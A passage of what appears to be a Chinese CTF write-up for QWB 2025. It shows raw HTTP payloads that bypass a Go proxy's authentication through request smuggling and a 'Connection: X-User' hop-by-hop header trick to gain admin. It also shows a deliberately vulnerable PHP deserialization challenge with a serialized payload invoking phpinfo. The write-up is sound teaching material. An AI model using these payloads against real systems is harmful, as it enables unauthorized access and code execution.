</span></span><span class=line><span class=cl>        <span class=n>label</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;label&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>login_value</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;login&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>password_plain</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;password&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>notes</span> <span class=o>=</span> <span class=n>request</span><span class=o>.</span><span class=n>form</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;notes&#39;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>)</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span> <span class=ow>or</span> <span class=kc>None</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>label</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>login_value</span> <span class=ow>or</span> <span class=ow>not</span> <span class=n>password_plain</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Service name, login, and password are required.&#39;</span><span class=p>,</span> <span class=s1>&#39;danger&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>        <span class=n>encrypted_password</span> <span class=o>=</span> <span class=n>fernet</span><span class=o>.</span><span class=n>encrypt</span><span class=p>(</span><span class=n>password_plain</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>entry</span> <span class=o>=</span> <span class=n>VaultEntry</span><span class=p>(</span>
</span></span><span class=line><span class=cl>            <span class=n>user_id</span><span class=o>=</span><span class=n>user</span><span class=o>.</span><span class=n>id</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>label</span><span class=o>=</span><span class=n>label</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>login</span><span class=o>=</span><span class=n>login_value</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>password_encrypted</span><span class=o>=</span><span class=n>encrypted_password</span><span class=p>,</span>
</span></span><span class=line><span class=cl>            <span class=n>notes</span><span class=o>=</span><span class=n>notes</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>commit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=n>flash</span><span class=p>(</span><span class=s1>&#39;Password entry saved.&#39;</span><span class=p>,</span> <span class=s1>&#39;success&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>redirect</span><span class=p>(</span><span class=n>url_for</span><span class=p>(</span><span class=s1>&#39;dashboard&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nd>@app.route</span><span class=p>(</span><span class=s1>&#39;/passwords/&lt;int:entry_id&gt;&#39;</span><span class=p>,</span> <span class=n>methods</span><span class=o>=</span><span class=p>[</span><span class=s1>&#39;DELETE&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl>    <span class=nd>@login_required</span>
</span></span><span class=line><span class=cl>    <span class=k>def</span> <span class=nf>delete_password</span><span class=p>(</span><span class=n>entry_id</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=n>user</span> <span class=o>=</span> <span class=n>g</span><span class=o>.</span><span class=n>current_user</span>
</span></span><span class=line><span class=cl>        <span class=n>entry</span> <span class=o>=</span> <span class=n>VaultEntry</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>filter_by</span><span class=p>(</span><span class=nb>id</span><span class=o>=</span><span class=n>entry_id</span><span class=p>,</span> <span class=n>user_id</span><span class=o>=</span><span class=n>user</span><span class=o>.</span><span class=n>id</span><span class=p>)</span><span class=o>.</span><span class=n>first</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=ow>not</span> <span class=n>entry</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;success&#39;</span><span class=p>:</span> <span class=kc>False</span><span class=p>,</span> <span class=s1>&#39;message&#39;</span><span class=p>:</span> <span class=s1>&#39;Entry not found&#39;</span><span class=p>}),</span> <span class=mi>404</span>
</span></span><span class=line><span class=cl>        <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>delete</span><span class=p>(</span><span class=n>entry</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>db</span><span class=o>.</span><span class=n>session</span><span class=o>.</span><span class=n>commit</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>jsonify</span><span class=p>({</span><span class=s1>&#39;success&#39;</span><span class=p>:</span> <span class=kc>True</span><span class=p>})</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>app</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>flask_app</span> <span class=o>=</span> <span class=n>create_app</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>flask_app</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>host</span><span class=o>=</span><span class=s1>&#39;127.0.0.1&#39;</span><span class=p>,</span> <span class=n>port</span><span class=o>=</span><span class=mi>5000</span><span class=p>,</span> <span class=n>debug</span><span class=o>=</span><span class=kc>False</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>看到 go 和 flask</p><p><a class=link href=https://portswigger.net/research/http1-must-die target=_blank rel=noopener>https://portswigger.net/research/http1-must-die</a>
defcon 今年的议题，我当时看着这个光头讲了半天没看懂，找到payload之后发现</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>8.147.135.168:37039</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>POST /login HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>Host: 8.147.135.168:37039
</span></span></span><span class=line><span class=cl><span class=g>Content-Length: 0
</span></span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /dashboard HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>Host: 8.147.135.168:37039
</span></span></span><span class=line><span class=cl><span class=g>X-User: 0
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/qwb-2025/1.png width=1909 height=488 loading=lazy alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>8.147.135.168:37039</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>keep-alive</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=g>
</span></span></span><span class=line><span class=cl><span class=g>GET /dashboard HTTP/1.1
</span></span></span><span class=line><span class=cl><span class=g>Host: 8.147.135.168:37039
</span></span></span><span class=line><span class=cl><span class=g>X-User: 0
</span></span></span></code></pre></td></tr></table></div></div><p><img src=/p/qwb-2025/2.png width=1927 height=566 loading=lazy alt=img></p><p>发现不能够过去，必须要登录， 但是如果我们发送一个包含<code>Connection: X-User</code>标头的请求，Go 代理（前端）首先尝试认证，认证失败后设置 <code>X-User: anonymous</code>，但在转发请求前，Go 代理遵守了 <code>Connection</code> 标头的逐跳指令，将自己设置的 <code>X-User</code> 标头删掉了。Python 后端收到的是一个完全不包含 <code>X-User</code> 标头的请求，就会默认设置为 0，也就是 admin 了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>GET</span> <span class=nn>/dashboard</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span>  <span class=l>8.147.135.168:37039</span>
</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>X-User</span>
</span></span></code></pre></td></tr></table></div></div><p><img src=/p/qwb-2025/3.png width=1948 height=1040 loading=lazy alt=img></p><h2 id=ezphp>ezphp</h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span><span class=lnt>80
</span><span class=lnt>81
</span><span class=lnt>82
</span><span class=lnt>83
</span><span class=lnt>84
</span><span class=lnt>85
</span><span class=lnt>86
</span><span class=lnt>87
</span><span class=lnt>88
</span><span class=lnt>89
</span><span class=lnt>90
</span><span class=lnt>91
</span><span class=lnt>92
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>generateRandomString</span><span class=p>(</span><span class=nv>$length</span> <span class=o>=</span> <span class=mi>8</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nv>$characters</span> <span class=o>=</span> <span class=s1>&#39;abcdefghijklmnopqrstuvwxyz&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=nv>$randomString</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=p>(</span><span class=nv>$i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=nv>$i</span> <span class=o>&lt;</span> <span class=nv>$length</span><span class=p>;</span> <span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$r</span> <span class=o>=</span> <span class=nx>rand</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=nx>strlen</span><span class=p>(</span><span class=nv>$characters</span><span class=p>)</span> <span class=o>-</span> <span class=mi>1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nv>$randomString</span> <span class=o>.=</span> <span class=nv>$characters</span><span class=p>[</span><span class=nv>$r</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nv>$randomString</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>date_default_timezone_set</span><span class=p>(</span><span class=s1>&#39;Asia/Shanghai&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>test</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$readflag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>readflag</span> <span class=o>=</span> <span class=k>new</span> <span class=k>class</span> <span class=err>{</span>
</span></span><span class=line><span class=cl>            <span class=k>public</span> <span class=k>function</span> <span class=fm>__construct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>            <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;error&#39;</span><span class=p>]</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$time</span> <span class=o>=</span> <span class=nx>date</span><span class=p>(</span><span class=s1>&#39;Hi&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$filename</span> <span class=o>=</span> <span class=nv>$GLOBALS</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$seed</span> <span class=o>=</span> <span class=nv>$time</span> <span class=o>.</span> <span class=nx>intval</span><span class=p>(</span><span class=nv>$filename</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=nx>mt_srand</span><span class=p>(</span><span class=nv>$seed</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$uploadDir</span> <span class=o>=</span> <span class=s1>&#39;uploads/&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$files</span> <span class=o>=</span> <span class=nx>glob</span><span class=p>(</span><span class=nv>$uploadDir</span> <span class=o>.</span> <span class=s1>&#39;*&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=k>foreach</span> <span class=p>(</span><span class=nv>$files</span> <span class=k>as</span> <span class=nv>$file</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>if</span> <span class=p>(</span><span class=nx>is_file</span><span class=p>(</span><span class=nv>$file</span><span class=p>))</span> <span class=nx>unlink</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$randomStr</span> <span class=o>=</span> <span class=nx>generateRandomString</span><span class=p>(</span><span class=mi>8</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$newFilename</span> <span class=o>=</span> <span class=nv>$time</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=nv>$randomStr</span> <span class=o>.</span> <span class=s1>&#39;.&#39;</span> <span class=o>.</span> <span class=s1>&#39;jpg&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$GLOBALS</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$newFilename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$uploadedFile</span> <span class=o>=</span> <span class=nv>$_FILES</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>][</span><span class=s1>&#39;tmp_name&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                    <span class=nv>$uploadPath</span> <span class=o>=</span> <span class=nv>$uploadDir</span> <span class=o>.</span> <span class=nv>$newFilename</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=nx>system</span><span class=p>(</span><span class=s2>&#34;cp &#34;</span> <span class=o>.</span> <span class=nv>$uploadedFile</span> <span class=o>.</span> <span class=s2>&#34; &#34;</span> <span class=o>.</span> <span class=nv>$uploadPath</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>echo</span> <span class=s2>&#34;success upload!&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                        <span class=k>echo</span> <span class=s2>&#34;error&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>};</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__wakeup</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nx>phpinfo</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>readflag</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// Note: This function is defined inside another method,
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// which might not behave as expected.
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>function</span> <span class=nf>readflag</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$GLOBALS</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nv>$file</span> <span class=o>=</span> <span class=nv>$GLOBALS</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>];</span>
</span></span><span class=line><span class=cl>                <span class=nv>$file</span> <span class=o>=</span> <span class=nx>basename</span><span class=p>(</span><span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/:\/\//&#39;</span><span class=p>,</span> <span class=nv>$file</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;error&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nv>$file_content</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;uploads/&#34;</span> <span class=o>.</span> <span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/&lt;\?|\:\/\/|ph|\?\=/i&#39;</span><span class=p>,</span> <span class=nv>$file_content</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>die</span><span class=p>(</span><span class=s2>&#34;Illegal content detected in the file.&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>include</span><span class=p>(</span><span class=s2>&#34;uploads/&#34;</span> <span class=o>.</span> <span class=nv>$file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$func</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=nv>$GLOBALS</span><span class=p>[</span><span class=s1>&#39;filename&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>readflag</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>==</span> <span class=s1>&#39;class&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>new</span> <span class=nv>$func</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span> <span class=k>if</span> <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>key</span> <span class=o>==</span> <span class=s1>&#39;func&#39;</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nv>$func</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nx>highlight_file</span><span class=p>(</span><span class=s1>&#39;index.php&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$ser</span> <span class=o>=</span> <span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;land&#39;</span><span class=p>])</span> <span class=o>?</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;land&#39;</span><span class=p>]</span> <span class=o>:</span> <span class=s1>&#39;O:4:&#34;test&#34;:N&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$ser</span><span class=p>);</span>
</span></span></code></pre></td></tr></table></div></div><p>很明显的反序列化漏洞，可以直接到反序列化，</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=err>?</span><span class=n>land</span><span class=o>=</span><span class=n>O</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=s2>&#34;test&#34;</span><span class=p>:</span><span class=mi>2</span><span class=p>:{</span><span class=n>s</span><span class=p>:</span><span class=mi>1</span><span class=p>:</span><span class=s2>&#34;f&#34;</span><span class=p>;</span><span class=n>s</span><span class=p>:</span><span class=mi>7</span><span class=p>:</span><span class=s2>&#34;phpinfo&#34;</span><span class=p>;</span><span class=n>s</span><span class=p>:</span><span class=mi>3</span><span class=p>:</span><span class=s2>&#34;key&#34;</span><span class=p>;</span><span class=n>s</span><span class=p>:</span><span class=mi>4</span><span class=p>:</span><span class=s2>&#34;func&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>得知php版本7.4.33，并且有部分 disable，没有 system 所以不影响，不需要绕过 wakeup，因为也没有影响。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>call_user_func_array</span><span class=p>,</span><span class=nx>call_user_func</span><span class=p>,</span><span class=nx>create_function</span><span class=p>,</span><span class=nx>ob_start</span><span class=p>,</span><span class=nx>passthru</span><span class=p>,</span><span class=nx>chown</span><span class=p>,</span><span class=nx>shell_exec</span><span class=p>,</span><span class=nx>popen</span><span class=p>,</span><span class=nx>proc_open</span><span class=p>,</span><span class=nx>pcntl_exec</span><span class=p>,</span><span class=nx>ini_alter</span><span class=p>,</span><span class=nx>ini_restore</span><span class=p>,</span><span class=nx>dl</span><span class=p>,</span><span class=nx>openlog</span><span class=p>,</span><span class=nx>syslog</span><span class=p>,</span><span class=nx>readlink</span><span class=p>,</span><span class=nx>symlink</span><span class=p>,</span><span class=nx>popepassthru</span><span class=p>,</span><span class=nx>pcntl_alarm</span><span class=p>,</span><span class=nx>pcntl_fork</span><span class=p>,</span><span class=nx>pcntl_waitpid</span><span class=p>,</span><span class=nx>pcntl_wait</span><span class=p>,</span><span class=nx>pcntl_wifexited</span><span class=p>,</span><span class=nx>pcntl_wifstopped</span><span class=p>,</span><span class=nx>pcntl_wifsignaled</span><span class=p>,</span><span class=nx>pcntl_wifcontinued</span><span class=p>,</span><span class=nx>pcntl_wexitstatus</span><span class=p>,</span><span class=nx>pcntl_wtermsig</span><span class=p>,</span><span class=nx>pcntl_wstopsig</span><span class=p>,</span><span class=nx>pcntl_signal</span><span class=p>,</span><span class=nx>pcntl_signal_dispatch</span><span class=p>,</span><span class=nx>pcntl_get_last_error</span><span class=p>,</span><span class=nx>pcntl_strerror</span><span class=p>,</span><span class=nx>pcntl_sigprocmask</span><span class=p>,</span><span class=nx>pcntl_sigwaitinfo</span><span class=p>,</span><span class=nx>pcntl_sigtimedwait</span><span class=p>,</span><span class=nx>pcntl_exec</span><span class=p>,</span><span class=nx>pcntl_getpriority</span><span class=p>,</span><span class=nx>pcntl_setpriority</span><span class=p>,</span><span class=nx>imap_open</span><span class=p>,</span><span class=nx>apache_setenv</span><span class=p>,</span>
